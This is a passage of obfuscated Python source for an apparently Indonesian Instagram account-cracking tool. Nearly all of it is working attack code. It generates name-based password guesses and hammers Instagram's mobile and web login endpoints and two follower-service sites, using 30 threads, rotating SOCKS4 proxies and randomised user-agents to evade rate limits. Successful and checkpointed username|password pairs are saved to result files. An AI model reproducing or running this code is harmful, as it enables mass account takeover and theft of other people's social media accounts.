      except (IOError ):#line:406
        exit (f"{P}[{M}!{P}]{M} File Tidak Ada")#line:407
      try :#line:408
        print (f"""
{B}[{P}*{B}]{P} Hasil Ok Tersimpan Di Results/Ok.txt
{B}[{P}*{B}]{P} Hasil Cp Tersimpan Di Results/Cp.txt
""")#line:412
        with ThreadPoolExecutor (max_workers =30 )as (OOO00OO00O0000000 ):#line:413
          for OOO00000000000OO0 in O00000OOO0OOOOO00 .list :#line:414
            OOO0O0000OOOO00O0 ,OOOO0000OO0O000OO =OOO00000000000OO0 .split ('<=>')#line:415
            O0OOO0O0OO0OO00O0 =OOOO0000OO0O000OO .split (' ')#line:416
            if OOOO0OO0O00000O0O in ['1','01']:#line:417
              OOOO0OOOOO0O0OO00 =[OOOO0000OO0O000OO ,OOOO0000OO0O000OO .replace (' ',''),O0OOO0O0OO0OO00O0 [0 ]+'123',O0OOO0O0OO0OO00O0 [0 ]+'12345']#line:418
            elif OOOO0OO0O00000O0O in ['2','02']:#line:419
              OOOO0OOOOO0O0OO00 =[OOOO0000OO0O000OO ,OOOO0000OO0O000OO .replace (' ',''),O0OOO0O0OO0OO00O0 [0 ]+'123',O0OOO0O0OO0OO00O0 [0 ]+'1234',O0OOO0O0OO0OO00O0 [0 ]+'12345',O0OOO0O0OO0OO00O0 [0 ]+'123456']#line:420
            elif OOOO0OO0O00000O0O in ['3','03']:#line:421
              OOOO0OOOOO0O0OO00 =O0O0OO00O0OO0OOO0 .split (',')#line:422
            else :#line:423
              OOOO0OOOOO0O0OO00 =[OOOO0000OO0O000OO ,OOOO0000OO0O000OO .replace (' ',''),O0OOO0O0OO0OO00O0 [0 ]+'123',O0OOO0O0OO0OO00O0 [0 ]+'12345']#line:424
            OOO00OO00O0000000 .submit (O00000OOO0OOOOO00 .__coid__ ,O00000OOO0OOOOO00 .list ,OOO0O0000OOOO00O0 ,OOOO0OOOOO0O0OO00 )#line:425
        exit (f"\n{H}[{P}Selesai{H}]{P}")#line:426
      except :exit (f"\n{H}[{P}Selesai{H}]{P}")#line:427
    else :#line:428
      exit (f"{P}[{M}!{P}]{M} Wrong Input")#line:429
  def __api__ (O000000OOOOOO00OO ,OOO000O000OOOO0OO ,O00O0000O00OO00O0 ,OOO0O00OOO00O000O ):#line:430
    try :#line:431
      for O0O00O0OO000O0OOO in OOO0O00OOO00O000O :#line:432
        O0O00O0OO000O0OOO =O0O00O0OO000O0OOO .lower ()#line:433
        O0OOO00OOOO0O0O00 ={'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)','Accept':'*/*','Cookie':'missing','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US','X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','Host':'i.instagram.com'}#line:444
        OOO0OOO00O0OOOOO0 ={'uuid':str (uuid4 ()),'password':O0O00O0OO000O0OOO ,'username':O00O0000O00OO00O0 ,'device_id':str (uuid4 ()),'from_reg':'false','_csrftoken':'missing','login_attempt_countn':'0'}#line:453
        with requests .Session ()as O00OOO0OO0O0000O0 :#line:454
          OOO0O00O000000OO0 =O00OOO0OO0O0000O0 .post ('https://i.instagram.com/api/v1/accounts/login/',headers =O0OOO00OOOO0O0O00 ,data =OOO0OOO00O0OOOOO0 ,allow_redirects =True )#line:455
          if 'logged_in_user'in str (OOO0O00O000000OO0 .text ):#line:456
            try :#line:457
              O000OOO0OO0O0O0OO =requests .get (f'https://www.instagram.com/{O00O0000O00OO00O0}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:458
              OOOOOO00O00O00O0O =(O000OOO0OO0O0O0OO ['edge_followed_by']['count'])#line:459
              O000OOOOO0OO0OO00 =(O000OOO0OO0O0O0OO ['edge_follow']['count'])#line:460
            except (IOError ,KeyError ):#line:461
              OOOOOO00O00O00O0O =('-')#line:462
              O000OOOOO0OO0OO00 =('-')#line:463
            except :pass #line:464
            print (f"\r{H}[{P}✔{H}]{P} Status : Success          ")#line:465
            print (f"{H}[{P}>{H}]{P} Username : {O00O0000O00OO00O0}")#line:466
            print (f"{H}[{P}>{H}]{P} Password : {O0O00O0OO000O0OOO}")#line:467
            print (f"{H}[{P}>{H}]{P} Pengikut : {OOOOOO00O00O00O0O}")#line:468
            print (f"{H}[{P}>{H}]{P} Mengikuti : {O000OOOOO0OO0OO00}\n")#line:469
            O000000OOOOOO00OO .live .append (f'{O00O0000O00OO00O0}|{O0O00O0OO000O0OOO}')#line:470
            with open ('Results/Ok.txt','a')as OO0OO0OOOO00000O0 :#line:471
              OO0OO0OOOO00000O0 .write (f'{O00O0000O00OO00O0}|{O0O00O0OO000O0OOO}\n')#line:472
            break #line:473
          elif 'challenge_required'in str (OOO0O00O000000OO0 .text ):#line:474
            try :#line:475
              O000OOO0OO0O0O0OO =requests .get (f'https://www.instagram.com/{O00O0000O00OO00O0}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:476
              OOOOOO00O00O00O0O =(O000OOO0OO0O0O0OO ['edge_followed_by']['count'])#line:477
              O000OOOOO0OO0OO00 =(O000OOO0OO0O0O0OO ['edge_follow']['count'])#line:478
            except (IOError ,KeyError ):#line:479
              OOOOOO00O00O00O0O =('-')#line:480
              O000OOOOO0OO0OO00 =('-')#line:481
            except :pass #line:482
            print (f"\r{K}[{P}✘{K}]{P} Status : Chekpoint          ")#line:483
            print (f"{K}[{P}>{K}]{P} Username : {O00O0000O00OO00O0}")#line:484
            print (f"{K}[{P}>{K}]{P} Password : {O0O00O0OO000O0OOO}")#line:485
            print (f"{K}[{P}>{K}]{P} Pengikut : {OOOOOO00O00O00O0O}")#line:486
            print (f"{K}[{P}>{K}]{P} Mengikuti : {O000OOOOO0OO0OO00}\n")#line:487
            O000000OOOOOO00OO .die .append (f'{O00O0000O00OO00O0}|{O0O00O0OO000O0OOO}')#line:488
            with open ('Results/Cp.txt','a')as OO0OO0OOOO00000O0 :#line:489
              OO0OO0OOOO00000O0 .write (f'{O00O0000O00OO00O0}|{O0O00O0OO000O0OOO}\n')#line:490
            break #line:491
          elif 'Please wait'in str (OOO0O00O000000OO0 .text )or 'ip_block'in str (OOO0O00O000000OO0 .text ):#line:492
            print (f"{P}[{M}!{P}]{M} Hidupkan Mode Pesawat 2 Detik...",end ='\r');time .sleep (10 );O000000OOOOOO00OO .__api__ (OOO000O000OOOO0OO ,O00O0000O00OO00O0 ,OOO0O00OOO00O000O )#line:493
          else :#line:494
            continue #line:495
      O000000OOOOOO00OO .looping +=1 #line:496
      print (f"{T}[{P}Crack{T}]{P} {str(len(OOO000O000OOOO0OO))}/{O000000OOOOOO00OO.looping} Cp-:-{len(O000000OOOOOO00OO.die)} Ok-:-{len(O000000OOOOOO00OO.live)}         ",end ='\r')#line:497
    except (ConnectionError ):#line:498
      print (f"{P}[{U}!{P}]{U} Koneksi Error                      ",end ='\r');time .sleep (5 );O000000OOOOOO00OO .__api__ (OOO000O000OOOO0OO ,O00O0000O00OO00O0 ,OOO0O00OOO00O000O )#line:499
    except :O000000OOOOOO00OO .__api__ (OOO000O000OOOO0OO ,O00O0000O00OO00O0 ,OOO0O00OOO00O000O )#line:500
  def __www__ (OO00OO0OO0O0OOO0O ,OO0O000OOO00OO00O ,OO00OO0O00000OO0O ,OO000O000OO000O00 ):#line:501
    try :#line:502
      for OOO00O0O00000OO0O in OO000O000OO000O00 :#line:503
        OOO00O0O00000OO0O =OOO00O0O00000OO0O .lower ()#line:504
        O0O0OO0OO00O00O00 ={'http':'socks4://%s'%(random .choice (open ("Data/proxies.txt","r").read ().splitlines ()))}#line:507
        O0OOOOO00000000O0 =requests .get ('https://www.instagram.com/').cookies ['csrftoken']#line:508
        O00O0O0O0OO0000O0 ={'User-Agent':random .choice (open ("Data/useragent.txt","r").read ().splitlines ()),'X-Requested-With':'XMLHttpRequest','Referer':'https://www.instagram.com/accounts/login/','x-csrftoken':O0OOOOO00000000O0 }#line:514
        O0OOOO00OO0OO00O0 ={'username':OO00OO0O00000OO0O ,'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{time}:{OOO00O0O00000OO0O}','queryParams':{},'optIntoOneTap':'false'}#line:520
        with requests .Session ()as OOOO00O0O00OOOO0O :#line:521
          O000OO00000O000OO =OOOO00O0O00OOOO0O .post ('https://www.instagram.com/accounts/login/ajax/',data =O0OOOO00OO0OO00O0 ,headers =O00O0O0O0OO0000O0 ,proxies =O0O0OO0OO00O00O00 )#line:522
          if 'userId'in str (O000OO00000O000OO .text ):#line:523
            try :#line:524
              OOO0OO0O0O0OO0000 =requests .get (f'https://www.instagram.com/{OO00OO0O00000OO0O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:525
              O000OO0OOOOO000O0 =(OOO0OO0O0O0OO0000 ['edge_followed_by']['count'])#line:526
              OO0000OOOO0O00O0O =(OOO0OO0O0O0OO0000 ['edge_follow']['count'])#line:527
            except (IOError ,KeyError ):#line:528
              O000OO0OOOOO000O0 =('-')#line:529
              OO0000OOOO0O00O0O =('-')#line:530
            except :pass #line:531
            print (f"\r{H}[{P}✔{H}]{P} Status : Success          ")#line:532
            print (f"{H}[{P}>{H}]{P} Username : {OO00OO0O00000OO0O}")#line:533
            print (f"{H}[{P}>{H}]{P} Password : {OOO00O0O00000OO0O}")#line:534
            print (f"{H}[{P}>{H}]{P} Pengikut : {O000OO0OOOOO000O0}")#line:535
            print (f"{H}[{P}>{H}]{P} Mengikuti : {OO0000OOOO0O00O0O}\n")#line:536
            OO00OO0OO0O0OOO0O .live .append (f'{OO00OO0O00000OO0O}|{OOO00O0O00000OO0O}')#line:537
            with open ('Results/Ok.txt','a')as OOOO00OO0OO000OOO :#line:538
              OOOO00OO0OO000OOO .write (f'{OO00OO0O00000OO0O}|{OOO00O0O00000OO0O}\n')#line:539
            break #line:540
          elif 'checkpoint_required'in str (O000OO00000O000OO .text ):#line:541
            try :#line:542
              OOO0OO0O0O0OO0000 =requests .get (f'https://www.instagram.com/{OO00OO0O00000OO0O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:543
              O000OO0OOOOO000O0 =(OOO0OO0O0O0OO0000 ['edge_followed_by']['count'])#line:544
              OO0000OOOO0O00O0O =(OOO0OO0O0O0OO0000 ['edge_follow']['count'])#line:545
            except (IOError ,KeyError ):#line:546
              O000OO0OOOOO000O0 =('-')#line:547
              OO0000OOOO0O00O0O =('-')#line:548
            except :pass #line:549
            print (f"\r{K}[{P}✘{K}]{P} Status : Chekpoint          ")#line:550
            print (f"{K}[{P}>{K}]{P} Username : {OO00OO0O00000OO0O}")#line:551
            print (f"{K}[{P}>{K}]{P} Password : {OOO00O0O00000OO0O}")#line:552
            print (f"{K}[{P}>{K}]{P} Pengikut : {O000OO0OOOOO000O0}")#line:553
            print (f"{K}[{P}>{K}]{P} Mengikuti : {OO0000OOOO0O00O0O}\n")#line:554
            OO00OO0OO0O0OOO0O .die .append (f'{OO00OO0O00000OO0O}|{OOO00O0O00000OO0O}')#line:555
            with open ('Results/Cp.txt','a')as OOOO00OO0OO000OOO :#line:556
              OOOO00OO0OO000OOO .write (f'{OO00OO0O00000OO0O}|{OOO00O0O00000OO0O}\n')#line:557
            break #line:558
          elif 'Please wait'in str (O000OO00000O000OO .text ):#line:559
            print (f"{P}[{M}!{P}]{M} Hidupkan Mode Pesawat 2 Detik...",end ='\r');time .sleep (10 );OO00OO0OO0O0OOO0O .__www__ (OO0O000OOO00OO00O ,OO00OO0O00000OO0O ,OO000O000OO000O00 )#line:560
          else :#line:561
            continue #line:562
      OO00OO0OO0O0OOO0O .looping +=1 #line:563
      print (f"{T}[{P}Crack{T}]{P} {str(len(OO0O000OOO00OO00O))}/{OO00OO0OO0O0OOO0O.looping} Cp-:-{len(OO00OO0OO0O0OOO0O.die)} Ok-:-{len(OO00OO0OO0O0OOO0O.live)}         ",end ='\r')#line:564
    except (ConnectionError ):#line:565
      print (f"{P}[{U}!{P}]{U} Koneksi Error                     ",end ='\r');time .sleep (5 );OO00OO0OO0O0OOO0O .__www__ (OO0O000OOO00OO00O ,OO00OO0O00000OO0O ,OO000O000OO000O00 )#line:566
    except :OO00OO0OO0O0OOO0O .__www__ (OO0O000OOO00OO00O ,OO00OO0O00000OO0O ,OO000O000OO000O00 )#line:567
  def __coid__ (O0OOO000OO000O0OO ,O0O0000OOOO000000 ,O00OO0OO00OOO000O ,OOO0OO0OOOOO0OO0O ):#line:568
    try :#line:569
      for OOO000OOO000OOO0O in OOO0OO0OOOOO0OO0O :#line:570
        OOO000OOO000OOO0O =OOO000OOO000OOO0O .lower ()#line:571
        with requests .Session ()as OOOOO0OO0O00O00O0 :#line:572
          O00OOO0O0O0O0O0OO ={'Host':'followersindonesia.co.id','content-length':'44','accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest','sec-ch-ua-mobile':'?1','save-data':'on','user-agent':random .choice (open ("Data/useragent.txt","r").read ().splitlines ()),'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://followersindonesia.co.id','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://followersindonesia.co.id/login',}#line:587
          O00O0OO00000OO0O0 ={'id':'','username':O00OO0OO00OOO000O ,'password':OOO000OOO000OOO0O }#line:592
          OOOO0O0OOOO000OO0 ={'http':'socks4://%s'%(random .choice (open ("Data/proxies.txt","r").read ().splitlines ()))}#line:595
          O0OO0OO0O000O00O0 =OOOOO0OO0O00O00O0 .post ('https://followersindonesia.co.id/ajax/login',data =O00O0OO00000OO0O0 ,headers =O00OOO0O0O0O0O0OO ,proxies =OOOO0O0OOOO000OO0 )#line:596
          if 'Sukses!'in str (O0OO0OO0O000O00O0 .text ):#line:597
            try :#line:598
              OOOO0OOO0OOO0OO00 =requests .get (f'https://www.instagram.com/{O00OO0OO00OOO000O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:599
              OO00000OO0OOO0OOO =(OOOO0OOO0OOO0OO00 ['edge_followed_by']['count'])#line:600
              O0O0O0OOOO0OO0OO0 =(OOOO0OOO0OOO0OO00 ['edge_follow']['count'])#line:601
            except (IOError ,KeyError ):#line:602
              OO00000OO0OOO0OOO =('-')#line:603
              O0O0O0OOOO0OO0OO0 =('-')#line:604
            except :pass #line:605
            print (f"\r{H}[{P}✔{H}]{P} Status : Success          ")#line:606
            print (f"{H}[{P}>{H}]{P} Username : {O00OO0OO00OOO000O}")#line:607
            print (f"{H}[{P}>{H}]{P} Password : {OOO000OOO000OOO0O}")#line:608
            print (f"{H}[{P}>{H}]{P} Pengikut : {OO00000OO0OOO0OOO}")#line:609
            print (f"{H}[{P}>{H}]{P} Mengikuti : {O0O0O0OOOO0OO0OO0}\n")#line:610
            O0OOO000OO000O0OO .live .append (f'{O00OO0OO00OOO000O}|{OOO000OOO000OOO0O}')#line:611
            with open ('Results/Ok.txt','a')as OO0O00OO00O00OO00 :#line:612
              OO0O00OO00O00OO00 .write (f'{O00OO0OO00OOO000O}|{OOO000OOO000OOO0O}\n')#line:613
            break #line:614
          elif 'Cekpoint'in str (O0OO0OO0O000O00O0 .text ):#line:615
            try :#line:616
              OOOO0OOO0OOO0OO00 =requests .get (f'https://www.instagram.com/{O00OO0OO00OOO000O}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:617
              OO00000OO0OOO0OOO =(OOOO0OOO0OOO0OO00 ['edge_followed_by']['count'])#line:618
              O0O0O0OOOO0OO0OO0 =(OOOO0OOO0OOO0OO00 ['edge_follow']['count'])#line:619
            except (IOError ,KeyError ):#line:620
              OO00000OO0OOO0OOO =('-')#line:621
              O0O0O0OOOO0OO0OO0 =('-')#line:622
            except :pass #line:623
            print (f"\r{K}[{P}✘{K}]{P} Status : Chekpoint          ")#line:624
            print (f"{K}[{P}>{K}]{P} Username : {O00OO0OO00OOO000O}")#line:625
            print (f"{K}[{P}>{K}]{P} Password : {OOO000OOO000OOO0O}")#line:626
            print (f"{K}[{P}>{K}]{P} Pengikut : {OO00000OO0OOO0OOO}")#line:627
            print (f"{K}[{P}>{K}]{P} Mengikuti : {O0O0O0OOOO0OO0OO0}\n")#line:628
            O0OOO000OO000O0OO .die .append (f'{O00OO0OO00OOO000O}|{OOO000OOO000OOO0O}')#line:629
            with open ('Results/Cp.txt','a')as OO0O00OO00O00OO00 :#line:630
              OO0O00OO00O00OO00 .write (f'{O00OO0OO00OOO000O}|{OOO000OOO000OOO0O}\n')#line:631
            break #line:632
          elif 'Please wait'in str (O0OO0OO0O000O00O0 .text ):#line:633
            print (f"{P}[{M}!{P}]{M} Please wait a few minutes...",end ='\r');time .sleep (15 );O0OOO000OO000O0OO .__coid__ (O0O0000OOOO000000 ,O00OO0OO00OOO000O ,OOO0OO0OOOOO0OO0O )#line:634
          else :#line:635
            continue #line:636
      O0OOO000OO000O0OO .looping +=1 #line:637
      print (f"{T}[{P}Crack{T}]{P} {str(len(O0O0000OOOO000000))}/{O0OOO000OO000O0OO.looping} Cp-:-{len(O0OOO000OO000O0OO.die)} Ok-:-{len(O0OOO000OO000O0OO.live)}         ",end ='\r')#line:638
    except (ConnectionError ):#line:639
      print (f"{P}[{U}!{P}]{U} Koneksi Error                     ",end ='\r');time .sleep (5 );O0OOO000OO000O0OO .__coid__ (O0O0000OOOO000000 ,O00OO0OO00OOO000O ,OOO0OO0OOOOO0OO0O )#line:640
    except :O0OOO000OO000O0OO .__coid__ (O0O0000OOOO000000 ,O00OO0OO00OOO000O ,OOO0OO0OOOOO0OO0O )#line:641
class __crack__ :#line:643
  def __init__ (O0O000OOOOO00O0OO ):#line:645
    O0O000OOOOO00O0OO .looping =0 #line:646
    O0O000OOOOO00O0OO .live =[]#line:647
    O0O000OOOOO00O0OO .die =[]#line:648
    try :#line:649
      O0O000OOOOO00O0OO .file =input (f"\n{B}[{P}*{B}]{P} Contoh : Results/Cp.txt\n{B}[{P}?{B}]{P} File : ")#line:650
      if len (O0O000OOOOO00O0OO .file )==0 :#line:651
        exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:652
      else :#line:653
        O0O000OOOOO00O0OO .split =input (f"{B}[{P}?{B}]{P} Pemisah : ");print (" ")#line:654
        if len (O0O000OOOOO00O0OO .split )==0 :#line:655
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:656
        else :#line:657
          O0O000OOOOO00O0OO .list =open (O0O000OOOOO00O0OO .file ,'r').read ().splitlines ()#line:658
          if len (O0O000OOOOO00O0OO .list )==0 :#line:659
            exit (f"{P}[{M}!{P}]{M} File Kosong")#line:660
          for OOO00OOOO00O000OO in O0O000OOOOO00O0OO .list :#line:661
            OOO0000O0O00O0000 =OOO00OOOO00O000OO .split (O0O000OOOOO00O0OO .split )[0 ]#line:662
            O0OOOO00O000OOOOO =OOO00OOOO00O000OO .split (O0O000OOOOO00O0OO .split )[1 ]#line:663
            O0O000OOOOO00O0OO .__main__ (O0O000OOOOO00O0OO .list ,OOO0000O0O00O0000 ,O0OOOO00O000OOOOO )#line:664
          exit (f"\n{H}[{P}Selesai{H}]{P}")#line:665
    except (IOError ):#line:666
      exit (f"{P}[{M}!{P}]{M} File Tidak Ada")#line:667
    except Exception as O0O0000O00O0OOO0O :#line:668
      exit (f"{P}[{M}!{P}]{M} {O0O0000O00O0OOO0O}")#line:669
  def __main__ (O0OOOO0O0OO00O0OO ,O0O00000O0O000O0O ,O0O0OOOOO00O0000O ,OO0OO000OO0O00O0O ):#line:670
    try :#line:671
      print (f"{T}[{P}Crack{T}]{P} {str(len(O0O00000O0O000O0O))}/{O0OOOO0O0OO00O0OO.looping} Cp-:-{len(O0OOOO0O0OO00O0OO.die)} Ok-:-{len(O0OOOO0O0OO00O0OO.live)}     ",end ='\r')#line:672
      OOOO0O000O00OOOO0 ={'Host':'igfollower.net','content-length':'93','accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest','user-agent':random .choice (open ("Data/useragent.txt","r").read ().splitlines ()),'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://igfollower.net','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://igfollower.net/girisyap','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}#line:686
      OOO00O00000OOOOO0 ={'username':O0O0OOOOO00O0000O ,'password':OO0OO000OO0O00O0O ,'userid':''}#line:691
      O00000OO0OOOO00OO ={'http':'socks4://%s'%(random .choice (open ("Data/proxies.txt","r").read ().splitlines ()))}#line:694
      with requests .Session ()as OOO0OO000OOO000O0 :#line:695
        O00OOOO0OOO0000O0 =OOO0OO000OOO000O0 .post ('https://igfollower.net/girisyap?',data =OOO00O00000OOOOO0 ,headers =OOOO0O000O00OOOO0 ,proxies =O00000OO0OOOO00OO ,timeout =None )#line:696
        if 'success'in str (O00OOOO0OOO0000O0 .json ()):#line:697
          O0OOOO0O0OO00O0OO .looping +=1 #line:698
          print (f"\r{H}[{P}Ok{H}]{P} {O0O0OOOOO00O0000O}|{OO0OO000OO0O00O0O}     ")#line:699
          O0OOOO0O0OO00O0OO .live .append (f'{O0O0OOOOO00O0000O}|{OO0OO000OO0O00O0O}')#line:700
        elif 'checkpoint'in str (O00OOOO0OOO0000O0 .json ()):#line:701
          O0OOOO0O0OO00O0OO .looping +=1 #line:702
          print (f"\r{K}[{P}Cp{K}]{P} {O0O0OOOOO00O0000O}|{OO0OO000OO0O00O0O}     ")#line:703
          O0OOOO0O0OO00O0OO .die .append (f'{O0O0OOOOO00O0000O}|{OO0OO000OO0O00O0O}')#line:704
        else :#line:705
          O0OOOO0O0OO00O0OO .looping +=1 #line:706
    except (ConnectionError ):#line:707
      print (f"{P}[{U}!{P}]{U} Koneksi Error               ",end ='\r');time .sleep (8 );O0OOOO0O0OO00O0OO .__main__ (O0O00000O0O000O0O ,O0O0OOOOO00O0000O ,OO0OO000OO0O00O0O )#line:708
    except :O0OOOO0O0OO00O0OO .__main__ (O0O00000O0O000O0O ,O0O0OOOOO00O0000O ,OO0OO000OO0O00O0O )#line:709
def __masuk__ ():#line:711
  try :#line:712
    O0OOOOO0OOOO0OOO0 =open ('Data/apikey.txt','r').read ()#line:713
  except (IOError ):#line:714
    __apikey__ ()#line:715
  else :#line:716
    __menu__ ()#line:717

